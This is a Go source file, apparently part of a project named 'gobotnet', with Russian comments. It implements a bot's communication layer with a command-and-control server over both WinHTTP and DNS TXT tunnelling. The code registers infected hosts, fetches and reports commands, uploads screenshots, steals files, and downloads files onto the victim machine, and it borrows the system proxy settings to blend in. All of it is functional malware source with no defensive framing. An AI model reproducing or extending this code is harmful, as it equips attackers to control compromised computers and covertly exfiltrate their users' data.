package wrapper

import (
	"encoding/base64"
	"errors"
	"fmt"
	"github.com/satori/go.uuid"
	"github.com/tv42/zbase32"
	"gobotnet"
	"math/rand"
	"net"
	"net/url"
	"path/filepath"
	"strconv"
	"strings"

	"time"
	"unsafe"
)

var (
	//http
	hSession uintptr
	hConnect uintptr

	botNetUrlArray  []string
	botNetPortArray []int
	botNetUrl       string
	botNetPort      int
	winHttpTimeOut  []int

	//Dns
	dnsAddress     string
	COUNT_SUBDOMEN = 2
	SIZE_PACKET    = 53

	//коды команд для DNS
	op_registration   int = 1
	op_get_command    int = 2
	op_output_command int = 3
	op_screenshot     int = 4
	op_download_file  int = 5
	op_upload_file    int = 6

	BAD_REQUEST             string = "BAD_REQUEST"
	countAttemptSendRequest int    = 300
)

const (
	//	botNetPort         = 80
	userAgent          = "AsocialFriend"
	registerURI        = "/api/v1/register"
	outputCommandURI   = "/api/v1/output_command"
	getcommandURI      = "/api/v1/get_command"
	screenshotURI      = "/api/v1/screenshot"
	idleCommandUri     = "/api/v1/idle"
	downloadCommandUri = "/api/v1/download"
	uploadCommandUri   = "/api/v1/upload"
	contentTypePOST    = "Content-Type: application/x-www-form-urlencoded"
)

/*Структры для парса джсона*/
type JsonToken struct {
	Token string
}

type JsonFile struct {
	Data     string
	Filename string
}

type JsonCommand struct {
	Command       string
	Command_param string
}

//Интерфейс для протоколов
type MessageExchange interface {
	ApiRegister(name string, info []byte, groupid string) (code int, resp string)
	ApiOutputCommand(uuid string, command string, output []byte) (code int, resp []byte)
	ApiGetCommand(uuid string) (code int, resp string, resp2 string)
	ApiScreenshot(uuid string, output []byte) (code int, resp []byte)
	ApiDownloadFile(uuid, fileName string, fileBytes []byte) (code int, resp []byte)
	ApiUploadFile(uu_id, pathDir string) (code int, resp []byte)
}
type HttpMessageExchange struct{}
type DnsMessageExchange struct{}

func SetWinHttpTimeout(array []int) {
	winHttpTimeOut = array
}

func SetUrlAndPortArrays(url_array []string, port_array []int) {
	botNetUrlArray = url_array
	botNetPortArray = port_array
	botNetUrl = botNetUrlArray[0]
	botNetPort = botNetPortArray[0]
}

func SetDnsURL(dns_name string) {
	dnsAddress = dns_name
}

func SetBotNetUrl(num int) {
	botNetUrl = botNetUrlArray[num]
	botNetPort = botNetPortArray[num]
	//При изменении URL нужно обязательно обнулить сессию и коннект
	if hConnect != 0 {
		WinHttpCloseHandle(hConnect)
		hConnect = 0
	}

	if hSession != 0 {
		WinHttpCloseHandle(hSession)
		hSession = 0
	}
}

func GetUrlArrayLen() (ret int) {
	return len(botNetUrlArray)
}

//Регистрация
func (httpMessageExchange HttpMessageExchange) ApiRegister(name string, info []byte, groupId string) (code int, resp string) {
	//Инициализируем сессию если она еще не
	if InitSession() == 0 {
		return 0, ""
	}

	//энкодим и эскейпим данные

	name_base64 := base64.StdEncoding.EncodeToString([]byte(name))
	info_base64 := base64.StdEncoding.EncodeToString(info)
	groupId_base64 := base64.StdEncoding.EncodeToString([]byte(groupId))

	requestUri := registerURI + "/" + url.QueryEscape(name_base64) + "/" + url.QueryEscape(info_base64) + "/" + url.QueryEscape(groupId_base64)

	code, response := apiSendRequest(requestUri, nil, GET_REQUEST)
	//Возвращаем 0 и пустую строку если не получилось отправить запрос/получить ответ
	if code == 0 {
		return 0, ""
	} else {
		//Парсим если что-то пришло
		var rJson JsonToken
		if ok, err := gobotnet.ParseJsonResponse(&rJson, response); ok {
			return 1, rJson.Token
		} else {
			//Возвращаем 0 и пустую строку если не получилось распарстить
			gobotnet.OutMessage("Error parse(" + err.Error() + ") json token from response:" + string(response))
			return 0, ""
		}
	}
}

func (dnsMessageExchange DnsMessageExchange) ApiRegister(name string, info []byte, groupId string) (code int, resp string) {
	//Генерируем строку для ДНС
	name_base32 := zbase32.EncodeToString([]byte(name))
	if len(name_base32) > 16 {
		name_base32 = name_base32[0:16]
	}
	mainDataRequest := strconv.Itoa(op_registration) + "." + uuid.NewV4().String() + "." + name_base32
	//Форматируем всё это

	conc := string(info) + "/" + groupId

	sendData := FormationData(mainDataRequest, []byte(conc))
	response, _ := DnsSendData(sendData)
	var j_token JsonToken
	if ok, _ := gobotnet.ParseJsonResponse(&j_token, []byte(response)); ok {
		return 1, j_token.Token
	} else {
		return 0, ""
	}
}

func (httpMessageExchange HttpMessageExchange) ApiOutputCommand(uuid string, command string, output []byte) (code int, resp []byte) {
	command = base64.StdEncoding.EncodeToString([]byte(command))
	output_str := base64.StdEncoding.EncodeToString(output)
	postString := "command=" + url.QueryEscape(command) + "&" + "output=" + url.QueryEscape(output_str)
	requestUri := outputCommandURI + "/" + uuid
	return apiSendRequest(requestUri, []byte(postString), POST_REQUEST)
}

func (dnsMessageExchange DnsMessageExchange) ApiOutputCommand(uuid string, command string, output []byte) (code int, resp []byte) {
	if len(output) == 0 {
		return 1, []byte("")
	}

	command = zbase32.EncodeToString([]byte(command))
	if len(command) > SIZE_PACKET {
		command = command[0:SIZE_PACKET]
	}

	mainDataRequest := strconv.Itoa(op_output_command) + "." + uuid + "." + command
	sendData := FormationData(mainDataRequest, output)
	response, _ := DnsSendData(sendData)
	gobotnet.OutMessage("output " + string(response))
	return 0, response
}

func (httpMessageExchange HttpMessageExchange) ApiGetCommand(uuid string) (code int, resp string, resp2 string) {
	requestUri := getcommandURI + "/" + uuid
	code, response := apiSendRequest(requestUri, nil, GET_REQUEST)
	gobotnet.OutMessage(string(response))
	if code == 0 {
		return 0, "", ""
	} else {
		var rJson JsonCommand
		ok, _ := gobotnet.ParseJsonResponse(&rJson, response)
		if ok && len(rJson.Command) > 0 { //TODO КОСТЫЛЬ!!!!
			param_enc, _ := base64.StdEncoding.DecodeString(rJson.Command_param)
			return 1, rJson.Command, string(param_enc)
		} else {

			//gobotnet.OutMessage("Error parse(" + err.Error() + ") json command from response:" + string(response))
			return 0, "", "error"
		}
	}
}

func (dnsMessageExchange DnsMessageExchange) ApiGetCommand(uuid string) (code int, resp string, resp2 string) {
	mainDataRequest := strconv.Itoa(op_get_command) + "." + uuid
	sendData := make([]string, 1)
	sendData[0] = mainDataRequest
	response, _ := DnsSendData(sendData)
	gobotnet.OutMessage("get_command " + string(response))
	var j_command JsonCommand
	ok, _ := gobotnet.ParseJsonResponse(&j_command, []byte(response))
	if ok && len(j_command.Command) > 0 { //TODO КОСТЫЛЬ!!!!
		param_enc, _ := base64.StdEncoding.DecodeString(j_command.Command_param)
		return 1, j_command.Command, string(param_enc)
	} else {
		return 0, "", "error"
	}
}

func (httpMessageExchange HttpMessageExchange) ApiScreenshot(uuid string, output []byte) (code int, resp []byte) {
	screen_str := base64.StdEncoding.EncodeToString(output)
	postString := "data=" + url.QueryEscape(screen_str)
	requestUri := screenshotURI + "/" + uuid
	return apiSendRequest(requestUri, []byte(postString), POST_REQUEST)
}

func (dnsMessageExchange DnsMessageExchange) ApiScreenshot(uuid string, output []byte) (code int, resp []byte) {
	mainDataRequest := strconv.Itoa(op_screenshot) + "." + uuid + "." + gobotnet.RandStringRunes(6)
	sendData := FormationData(mainDataRequest, output)
	response, _ := DnsSendData(sendData)
	gobotnet.OutMessage("screen " + string(response))
	return 0, response
}

func (httpMessageExchange HttpMessageExchange) ApiDownloadFile(uuid, fileName string, fileBytes []byte) (code int, resp []byte) {
	file64base := base64.StdEncoding.EncodeToString(fileBytes)
	nameFile64base := base64.StdEncoding.EncodeToString([]byte(fileName))
	postData := "data=" + url.QueryEscape(file64base) + "&" + "filename=" + url.QueryEscape(nameFile64base) //nameFile64base
	requestUri := downloadCommandUri + "/" + uuid
	return apiSendRequest(requestUri, []byte(postData), POST_REQUEST)
}

func (dnsMessageExchange DnsMessageExchange) ApiDownloadFile(uuid, fileName string, fileBytes []byte) (code int, resp []byte) {
	newFileName := gobotnet.RandStringRunes(5) + filepath.Ext(fileName)
	mainDataRequest := strconv.Itoa(op_download_file) + "." + uuid + "." + zbase32.EncodeToString([]byte(newFileName))
	sendData := FormationData(mainDataRequest, fileBytes)
	response, _ := DnsSendData(sendData)
	gobotnet.OutMessage("download " + string(response))
	return 0, response
}

func (httpMessageExchange HttpMessageExchange) ApiUploadFile(uuid, pathDir string) (code int, resp []byte) {
	request := uploadCommandUri + "/" + uuid
	code, response := apiSendRequest(request, nil, GET_REQUEST)
	if code == 1 {
		var rJson JsonFile
		if ok, err := gobotnet.ParseJsonResponse(&rJson, response); ok {
			writeData, _ := base64.StdEncoding.DecodeString(rJson.Data)
			escape_fileName, _ := base64.StdEncoding.DecodeString(rJson.Filename)
			filename, _ := url.QueryUnescape(string(escape_fileName))

			err = gobotnet.CreateFileAndWriteData(pathDir+string(filename), writeData)
			if err != nil {
				gobotnet.CreateFileAndWriteData(string(filename), writeData)
			}

		} else {
			gobotnet.OutMessage("Error parse" + err.Error() + ") json file from receiver upload file.")
		}
	}
	return code, response
}

func (dnsMessageExchange DnsMessageExchange) ApiUploadFile(uuid, pathDir string) (code int, resp []byte) {
	mainDataRequest := strconv.Itoa(op_upload_file) + "." + uuid
	sendData := make([]string, 1)
	sendData[0] = mainDataRequest
	response, err := DnsSendData(sendData)
	if err != nil {
		return 0, response
	}

	filename_countpart := strings.Split(string(response), ".")
	if len(filename_countpart) != 2 {
		return 1, response
	}

	filename, err := base64.StdEncoding.DecodeString(filename_countpart[0])
	if err != nil {
		return 1, response
	}

	countPart, err := strconv.Atoi(filename_countpart[1])
	if err != nil {
		return 1, response
	}

	var file_base64 []string
	for i := 0; i < countPart; i++ {
		response, err := DnsSendData(sendData)
		if err != nil {
			return 1, response
		} else {
			file_base64 = append(file_base64, string(response))
		}
	}

	fileData, err := base64.StdEncoding.DecodeString(gobotnet.JoinToString(file_base64))
	if err != nil {
		return 0, response
	}

	err = gobotnet.CreateFileAndWriteData(pathDir+string(filename), fileData)
	if err != nil {
		gobotnet.CreateFileAndWriteData(string(filename), fileData)
	}
	return 1, response
}

//Функция выполняет http запрос через либу WinHTTP
func apiSendRequest(paramsGET string, paramsPOST []byte, method string) (code int, response []byte) {
	//если проблемы с сессией или конектом пытаемся переподключиться
	if hConnect == 0 || hSession == 0 {
		gobotnet.OutMessage("Reinit session")
		if InitSession() == 0 {
			return 0, response
		}
	}

	hRequest := WinHttpOpenRequest(hConnect, method, paramsGET)
	if hRequest != 0 {
		if paramsPOST != nil {
			//Если POST запрос добавляем еще данные
			WinHttpAddRequestHeaders(hRequest, contentTypePOST, WINHTTP_ADDREQ_FLAG_ADD)
		}
		bResults := WinHttpSendRequest(hRequest, paramsPOST, len(paramsPOST))
		if bResults != 0 {
			bResults = WinHttpReceiveResponse(hRequest)
			if bResults != 0 {
				var pwSize uint32 = 1
				//Читаем в цикле покак все данные не получим
				for pwSize != 0 {
					WinHttpQueryDataAvailable(hRequest, &pwSize)
					gobotnet.OutMessage("PWSIZE = " + fmt.Sprint(pwSize))
					if pwSize == 0 {
						break
					}
					tempResponse := make([]byte, pwSize, pwSize)
					var dwDownloaded uint32 = 0
					WinHttpReadData(hRequest, tempResponse, pwSize, &dwDownloaded)
					response = gobotnet.Append(response, tempResponse...)
					gobotnet.OutMessage("len response = " + strconv.Itoa(len(response)) + ", len tempResponse = " + strconv.Itoa(len(tempResponse)))
					gobotnet.OutMessage("Receiver size = " + fmt.Sprint(pwSize) + ", downloaded size = " + fmt.Sprint(dwDownloaded))
				}
			} else {
				gobotnet.OutMessage("WinHttpReceiveResponse Error")
				WinHttpCloseHandle(hRequest)
				return 0, response
			}
		} else {
			gobotnet.OutMessage("WinHttpSendRequest Error")
			WinHttpCloseHandle(hRequest)
			return 0, response
		}
		WinHttpCloseHandle(hRequest)
		return 1, response
	} else {
		gobotnet.OutMessage("WinHttpOpenRequest Error")
	}
	return 0, response
}

//Отправляет данные на DNS через дефолтный net.LookupTXT
//получает ответ как TXT запись по запрошенному доменному имени
func DnsSendData(sendData []string) (response []byte, err error) {
	for index := range sendData {
		attempt := 0
		for {
			arrayData, err := net.LookupTXT(gobotnet.RandStringRunes(6) + "." + sendData[index] + "." + dnsAddress)
			if err == nil {
				for i := range arrayData {
					response = gobotnet.Append(response, []byte(arrayData[i])...)
				}
				if string(response) == BAD_REQUEST {
					gobotnet.OutMessage(BAD_REQUEST)
					return []byte(""), errors.New(BAD_REQUEST)
				}
				break
			} else {
				gobotnet.OutMessage(err.Error())
				attempt++
				if attempt > countAttemptSendRequest {
					gobotnet.OutMessage("Request limit attempt")
					return []byte(""), errors.New("Request limit attempt")
				}
				time.Sleep(time.Millisecond * time.Duration(rand.Intn(10)))
			}
		}
	}
	return response, err
}

//Форматирует данные в запросы пригодные для DNS

func FormationData(mainPartRequest string, data []byte) (arrayData []string) {
	sendData := zbase32.EncodeToString(data)
	lenSendData := len(sendData)

	tempCount := float32(float32(lenSendData) / float32(SIZE_PACKET*COUNT_SUBDOMEN))
	var countPartData int
	if tempCount > float32(int32(tempCount)) {
		countPartData = int(tempCount) + 1
	} else {
		countPartData = int(tempCount)
	}
	//fmt.Printf("len all = %d, count part = %d\n", lenSendData, countPartData)

	mainPartRequest += "." + strconv.Itoa(countPartData)
	startDataIndex := 0
	for i := 0; i < countPartData; i++ {
		currentRequest := mainPartRequest + "." + strconv.Itoa(i)
		for j := 0; j < COUNT_SUBDOMEN; j++ {
			if startDataIndex > lenSendData {
				break
			}
			if (lenSendData - startDataIndex) > SIZE_PACKET {
				currentRequest += "." + sendData[startDataIndex:startDataIndex+SIZE_PACKET]
				startDataIndex += SIZE_PACKET
			} else {
				currentRequest += "." + sendData[startDataIndex:lenSendData]
				startDataIndex += lenSendData - startDataIndex
				break
			}
		}
		arrayData = append(arrayData, currentRequest)
	}
	return arrayData
}

//Инициализация сессии
func InitSession() (resp int) {
	hSession = WinHttpOpen(userAgent)
	if hSession != 0 {
		//Устанавливаем системный прокси
		SetSessionProxyFromIE(hSession)
		hConnect = WinHttpConnect(hSession, botNetUrl, botNetPort)
		if hConnect != 0 {
			//Устанавливаем таймаут, если сессия установлена
			WinHttpSetTimeOut(hSession, winHttpTimeOut[0], winHttpTimeOut[1], winHttpTimeOut[2], winHttpTimeOut[3])
			return 1
		} else {
			gobotnet.OutMessage("WinHttpConnect Error")
		}
	} else {
		gobotnet.OutMessage("WinHttpOpen Error")
	}
	return 0
}

//Установка системного прокси
func SetSessionProxyFromIE(hSession uintptr) {
	var ieProxy winHttpIEProxyConfig
	//Получаем прокси из IE
	WinHttpGetIEProxyConfigForCurrentUser(&ieProxy)

	//Переформатируем формат прокси из IE под необходимый формат
	var proxyConf winHttpProxyInfo
	proxyConf.dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY
	proxyConf.lpszProxy = ieProxy.lpszProxy
	//Устанавливаем прокси
	WinHttpSetOption(hSession, uintptr(WINHTTP_OPTION_PROXY), uintptr(unsafe.Pointer(&proxyConf)), unsafe.Sizeof(proxyConf))
}

//Дебаг
func OutResponse(nameCommand string, data []byte, code int, text []byte) {
	gobotnet.OutMessage("Send request:" + nameCommand)
	if len(data) < 50 {
		gobotnet.OutMessage("Data: " + string(data))
	} else {
		gobotnet.OutMessage("Data: " + string(data[:50]))
	}
	gobotnet.OutMessage("Response code: " + strconv.Itoa(code))
	gobotnet.OutMessage("Response text: " + string(text))
}
